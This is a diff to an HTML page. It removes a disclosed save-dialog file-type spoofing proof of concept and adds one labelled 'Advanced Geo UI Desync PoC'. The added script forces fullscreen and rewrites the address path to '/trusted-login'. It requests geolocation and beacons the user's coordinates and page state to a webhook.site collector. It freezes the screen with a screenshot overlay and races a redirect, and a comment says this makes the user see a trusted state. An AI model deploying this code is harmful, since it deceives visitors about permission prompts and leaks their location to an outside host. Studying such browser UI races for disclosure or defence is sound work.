@@ -1,58 +1,131 @@
 <!doctype html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>File System Access API - save As JPEG executable</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="favicon.png">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Advanced Geo UI Desync PoC</title>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+<style>
+body {
+  margin:0;
+  font-family:system-ui;
+  background:#f5f5f7;
+  text-align:center;
+}
+button {
+  margin-top:100px;
+  font-size:16px;
+  padding:14px 18px;
+  border-radius:12px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+}
+</style>
 </head>
 
 <body>
-    <h3>File System Access API - Save shows saving as JPEG, however, download as an executable bat</h3>
-    <h4>Found by Maciej Pulikowski - maciekpul@gmail.com</h4>
 
-    <hr>
-    <h3>Gif example/proof:</h3>
-    <a href="saveExample1.gif" target="_blank">GIF URL</a>
-    <hr>
-    <h3>Code example/proof:</h3>
-    <div style="display: flex; flex-direction: column">
-        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
-        <div>
-            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
-        </div>
+<button id="start">Start Demo</button>
 
-    </div>
-    <script>
-        const butSaveNewFile = document.getElementById('addNewFile')
-        butSaveNewFile.addEventListener('click', async () => {
-            const options = {
-                types: [
-                    {
-                        description:
-                            'JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         ',
-                        accept: {
-                            'text/plain': ['.bat']
-                        },
-                        content: 'C:\\Windows\\system32\\calc.exe'
-                    }
-                ]
-            }
-            const handle = await window.showSaveFilePicker(options)
-            const writable = await handle.createWritable()
-            await writable.write('C:\\Windows\\system32\\calc.exe')
-            await writable.close()
-            alert('File saved')
-        })
-    </script>
-    <hr>
-    <h3>Explanation:</h3>
-    <img src="explanation.png" alt="awesome code" width="1821" height="576">
-    <hr>
-    <h3>Solution:</h3>
-    <p style="font-size: 25px">Force filename extension with accept extension.</p>
+<script>
+const LOG = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+
+function log(type, extra={}) {
+  const data = {
+    type,
+    t: performance.now(),
+    url: location.href,
+    origin: location.origin,
+    vis: document.visibilityState,
+    ...extra
+  };
+  new Image().src = LOG + "?" + new URLSearchParams(data);
+}
+
+function requestGeo() {
+  log("geo_request");
+
+  navigator.geolocation.getCurrentPosition(
+    pos => log("geo_success", {
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude
+    }),
+    err => log("geo_error", {code: err.code})
+  );
+}
+
+function freezeUI() {
+  html2canvas(document.body,{
+    scale:2,
+    useCORS:true
+  }).then(canvas => {
+
+    const img = document.createElement("img");
+    img.src = canvas.toDataURL("image/png");
+
+    Object.assign(img.style,{
+      position:"fixed",
+      top:"0",
+      left:"0",
+      width:"100vw",
+      height:"100vh",
+      objectFit:"cover",
+      zIndex:"999999"
+    });
+
+    document.body.innerHTML="";
+    document.body.appendChild(img);
+
+    log("ui_frozen");
+  });
+}
+
+document.getElementById("start").onclick = () => {
+
+  log("click");
+
+  // 1. Fullscreen
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen();
+  }
+
+  // 2. Spoof path
+  history.replaceState({}, '', '/trusted-login');
+  log("url_spoofed");
+
+  // 3. Trigger permission
+  requestGeo();
+
+  // 4. Race chain
+  Promise.resolve().then(()=>{
+    requestAnimationFrame(()=>{
+      requestAnimationFrame(()=>{
+
+        log("before_redirect");
+
+        // 5. Freeze UI (biar user lihat trusted state)
+        freezeUI();
+
+        // 6. Redirect (race)
+        setTimeout(()=>{
+          location.replace("https://google.com:9090");
+        },50);
+
+      });
+    });
+  });
+
+};
+
+// extra visibility tracking
+document.addEventListener("visibilitychange",()=>{
+  log("visibility_change",{state:document.visibilityState});
+});
+</script>
 
 </body>
-
 </html>
